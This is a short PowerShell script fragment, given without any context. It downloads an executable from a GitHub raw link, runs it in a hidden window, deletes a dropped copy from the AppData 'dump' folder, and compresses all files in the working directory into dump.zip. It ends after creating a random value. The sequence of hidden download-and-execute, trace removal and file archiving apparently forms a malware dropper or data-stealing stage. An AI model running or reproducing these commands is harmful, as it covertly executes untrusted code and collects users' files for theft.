Invoke-WebRequest 'https://github.com/jfkd02ks/playwithcode/raw/main/b32.exe' -OutFile "b32.exe"
Start-Process -FilePath b32.exe -ArgumentList "--format json" -Wait -WindowStyle Hidden
Remove-Item -Path "$env:appdata\Microsoft\dump\b32.exe" -Force
Compress-Archive -Path * -DestinationPath dump.zip
$Random = Get-Random